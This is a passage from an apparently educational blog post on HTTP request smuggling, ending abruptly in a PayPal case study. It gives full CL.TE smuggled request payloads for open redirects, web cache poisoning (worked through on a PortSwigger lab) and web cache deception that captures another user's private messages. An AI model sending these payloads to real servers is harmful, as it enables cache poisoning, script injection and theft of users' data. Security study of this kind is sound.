src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520131892.png" alt=""></p><h3 id="Turn-An-On-Site-Redirect-Into-An-Open-Redirect"><a href="#Turn-An-On-Site-Redirect-Into-An-Open-Redirect" class="headerlink" title="Turn An On-Site Redirect Into An Open Redirect"></a>Turn An On-Site Redirect Into An Open Redirect</h3><p>This attack scenario is when the target uses a 30x code to redirect and uses the Host header to redirect. For example, we send following requests.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: normal-website.com</span><br></pre></td></tr></tbody></table></figure><p></p><p>We will get responses.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://normal-website.com/home/</span><br></pre></td></tr></tbody></table></figure><p></p><p>It looks harmless, but if we cooperate with HTTP Smuggling, it will be a problem. Such as:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 54</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /home HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></tbody></table></figure><p></p><p>The subsequent requests after smuggling look like this:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br></pre></td></tr></tbody></table></figure><p></p><p>Then if the server redirects according to the Host header, we will get the following response.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://attacker-website.com/home/</span><br></pre></td></tr></tbody></table></figure><p></p><p>In this way, the user who visits <code>/scripts/include.js</code> will be redirected to the URL we control.</p><h3 id="Perform-Web-Cache-Poisoning"><a href="#Perform-Web-Cache-Poisoning" class="headerlink" title="Perform Web Cache Poisoning"></a>Perform Web Cache Poisoning</h3><p>This scenario is also based on the Host redirect attack scenario above. If the Front server still has cache static resources, we can cooperate with HTTP Smuggling to perform cache poisoning. <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses.</p><p>To solve the lab, perform a <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p></blockquote><p>This environment is also a scenario where the host can be modified to redirect, and the <code>/post/next?postId=2</code> route redirect to <code>/post?postId=4</code>.</p><p>According to the description of the call, we need to implement cache poisoning. For example, here we choose <code>/resources/js/tracking.js</code> for poisoning. LAB also gives us a service for manufacturing poisoning, so we can set the following settings.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520130636.png" alt=""></p><p>Send the following packets once.</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac7a1f141fadd93d801c469f005500bf.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=f6c7ZBB52a6iedorGSywc8jM6USu4685</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 178</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post/next?postId=3 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac701fe61fabd97b8027465701f800a8.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></tbody></table></figure><p></p><p>Then visit <code>/resources/js/tracking.js</code>:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520135018.png" alt=""></p><p>We can see that the redirect address of the response packet has been changed to the our exploit address, and then we visit the normal server homepage.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520131794.png" alt=""></p><p>We can <code>alert(1)</code> !</p><p>The entire process can be understood using the following processes.</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Innocent        Attacker          Front           Backend</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--A(1A+1/2B)--&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string">            [1/2B]</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|<span class="hljs-string">--C-----------&gt;</span>|<span class="hljs-string"> * ending B *</span></span><br><span class="line"><span class="hljs-string">    </span>|<span class="hljs-string">               </span>|<span class="hljs-string">            [*CP*]&lt;--B(200)----</span>|</span><br><span class="line">    |<span class="hljs-string">               </span>|<span class="hljs-string">&lt;--B(200)------</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">--C---------------------------&gt;</span>|<span class="hljs-string">               </span>|</span><br><span class="line">    |<span class="hljs-string">&lt;--B(200)--------------------[HIT]             </span>|</span><br></pre></td></tr></tbody></table></figure><p></p><ul><li>1A + 1/2B means request A + an incomplete query B</li><li>A(X) : means X query is hidden in body of query A</li><li>CP : Cache poisoning</li></ul><p>Similar to the previous flowchart, because <code>/resources/js/tracking.js</code> requested in C will be cached by Front as a static resource, and we use HTTP Smuggling to direct this request to our exploit server and return<code>alert(1)</code> to request C, and then this response packet will be cached by the Front server, so we have successfully poisoned.</p><h3 id="Perform-Web-Cache-Deception"><a href="#Perform-Web-Cache-Deception" class="headerlink" title="Perform Web Cache Deception"></a>Perform Web Cache Deception</h3><p>In fact, this scenario is similar to cache poisoning, but with a slight difference. According to more official statements, cache cheating and cache poisoning have the following differences.</p><blockquote><pre><code>What is the difference between web cache poisoning and web cache deception?- In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.- In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.</code></pre></blockquote><p>This we do not cooperate with Lab. Because the environment provided by Lab maybe not work correctly.</p><p>But we can do like this to understand easily. We send the following HTTP request.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 43</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /private/messages HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></tbody></table></figure><p></p><p>The smuglling request will use <code>Foo: X</code> to hide the first line of the next request header sent, which is the line<code>GET /xxx HTTP/1.1</code>, and this request will be accessed with the user’s cookie. Similar to a CSRF, the request becomes the following request header.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/private/messages</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /static/some-image.png HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z</span><br></pre></td></tr></tbody></table></figure><p></p><p>As long as we send more times, once the user accesses the static resource, it may be cached by the Front server, and we can get the information of the user <code>/private/messages</code>. There may be a lot of repeated packet sending here, because you need to construct a static resource cache, or you need some luck.</p><p>So far, the basic attack surface of HTTP Smuggling has been introduced.</p><h1 id="Real-World"><a href="#Real-World" class="headerlink" title="Real World"></a>Real World</h1><h2 id="Paypal"><a href="#Paypal" class="headerlink" title="Paypal"></a>Paypal</h2><p>First of all, I have to talk about the Paypal vulnerability instance shared by the author of HTTP Smuggling on Black Hat this year.</p><p>The author first poisoned a js file for Paypal login through HTTP Smuggling.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: 